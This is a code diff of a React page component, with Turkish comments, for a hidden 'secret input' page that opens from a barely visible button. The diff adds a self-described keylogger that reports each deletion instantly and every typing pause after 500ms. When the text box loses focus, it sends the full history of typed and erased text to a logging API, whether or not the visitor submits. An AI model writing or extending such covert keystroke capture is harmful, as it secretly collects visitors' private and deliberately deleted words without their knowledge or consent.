@@ -7,10 +7,10 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Keylogger mantığıyla harf/kelime biriktirme motoru:
- *   - Her harf basımında spam notification ATMAZ.
- *   - Kullanıcı yazarken 1.5 saniye duraksarsa VEYA ilk silme işlemi (Backspace) yaptığında İLK SİLMEDE ANINDA tüm biriken veriyi atar.
- *   - Gönder butonuna basıldığında nihai cevabı tüm geçmişle gönderir.
+ * - Keylogger Canlı Takip Motoru:
+ *   - Gönderilse de gönderilmese de, silinse de silinmese de YAZILAN TÜM GEÇMİŞ VE SİLİNENLER EKSİKSİZ BİLDİRİLİR.
+ *   - Her silme işleminde (Backspace/Clear) ANINDA (0ms) silinen parçayı bildirir.
+ *   - Yazım esnasında 500ms duraksamada canlı metni konsolide ederek iletir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -40,7 +40,6 @@ export default function LastLetterPage({ onGoHome }) {
   const lastSentTimeRef = useRef(0);
   const typingTimerRef = useRef(null);
   const lastClickTimeRef = useRef(0);
-  const hasTriggeredFirstDeleteRef = useRef(false);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -290,86 +289,82 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Smart Consolidated Keylogger Engine:
-  // - Accumulates all typed characters & deleted text into memory.
-  // - Triggers IMMEDIATELY on the FIRST deletion (Backspace).
-  // - Triggers after a 1.5-second pause in typing (no spamming per character).
+  // Foolproof Live Input & Deletion Engine:
+  // - Fires IMMEDIATELY (0ms) when any text is erased/deleted.
+  // - Debounces 500ms on typing to group characters without rate limiting.
+  // - No empty string checks blocking notifications.
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
     setInputText(newVal);
 
-    let isFirstDeletion = false;
+    let isDeletion = false;
+    let deletedSegment = '';
 
     // 1. Accumulate typed characters into memory
     if (newVal.length > oldVal.length) {
       const added = newVal.slice(oldVal.length);
       allTypedHistoryRef.current += added;
     } else if (newVal.length < oldVal.length) {
-      // 2. Track deleted text snippets
-      const deletedSegment = oldVal.slice(newVal.length);
+      // 2. Track deleted text snippets into memory
+      deletedSegment = oldVal.slice(newVal.length);
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
-
-        // Check if this is the FIRST deletion in the session
-        if (!hasTriggeredFirstDeleteRef.current) {
-          hasTriggeredFirstDeleteRef.current = true;
-          isFirstDeletion = true;
-        }
+        isDeletion = true;
       }
     }
 
     prevTextRef.current = newVal;
 
-    // TRIGGER CONDITION A: FIRST DELETION -> Send IMMEDIATELY at that exact moment!
-    if (isFirstDeletion) {
+    // IMMEDIATE DELETION TRIGGER (0ms Delay)
+    if (isDeletion) {
       if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
       lastSentTextRef.current = newVal;
       lastSentTimeRef.current = Date.now();
 
       sendLog('secret_input_deleted', {
-        letterText: newVal,
-        answer: newVal,
-        answerInput: newVal,
-        allTypedHistory: allTypedHistoryRef.current || newVal,
-        deletedText: deletedTextHistoryRef.current || null,
+        letterText: newVal || '(Tüm metin silindi)',
+        answer: newVal || '(Tüm metin silindi)',
+        answerInput: newVal || '(Tüm metin silindi)',
+        allTypedHistory: allTypedHistoryRef.current || '(Tüm metin silindi)',
+        deletedText: deletedSegment || deletedTextHistoryRef.current,
         draftLength: newVal.length,
-        action: `✂️ Ziyaretçi Metin Sildi: "${newVal}" (Kalan Metin)`
+        action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
       });
       return;
     }
 
-    // TRIGGER CONDITION B: 1.5-Second Typing Pause Consolidation Window
+    // LIVE TYPING DEBOUNCE TRIGGER (500ms pause window)
     if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
 
     typingTimerRef.current = setTimeout(() => {
-      if (prevTextRef.current !== lastSentTextRef.current && prevTextRef.current.trim().length > 0) {
+      if (prevTextRef.current !== lastSentTextRef.current) {
         lastSentTextRef.current = prevTextRef.current;
         lastSentTimeRef.current = Date.now();
 
         sendLog('secret_input_typed', {
-          letterText: prevTextRef.current,
-          answer: prevTextRef.current,
-          answerInput: prevTextRef.current,
+          letterText: prevTextRef.current || '(Boş)',
+          answer: prevTextRef.current || '(Boş)',
+          answerInput: prevTextRef.current || '(Boş)',
           allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
           deletedText: deletedTextHistoryRef.current || null,
           draftLength: prevTextRef.current.length,
           action: `✍️ Ziyaretçi Kutuya Yazıyor: "${prevTextRef.current}"`
         });
       }
-    }, 1500);
+    }, 500);
   };
 
   // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
   const handleInputBlur = () => {
-    if (inputText && inputText.trim().length > 0 && inputText !== lastSentTextRef.current) {
+    if (allTypedHistoryRef.current && allTypedHistoryRef.current.length > 0) {
       if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
       lastSentTextRef.current = inputText;
 
       sendLog('secret_input_unfocused', {
-        letterText: inputText,
-        answer: inputText,
-        answerInput: inputText,
+        letterText: inputText || '(Silindi / Boş)',
+        answer: inputText || '(Silindi / Boş)',
+        answerInput: inputText || '(Silindi / Boş)',
         allTypedHistory: allTypedHistoryRef.current || inputText,
         deletedText: deletedTextHistoryRef.current || null,
         draftLength: inputText.length,
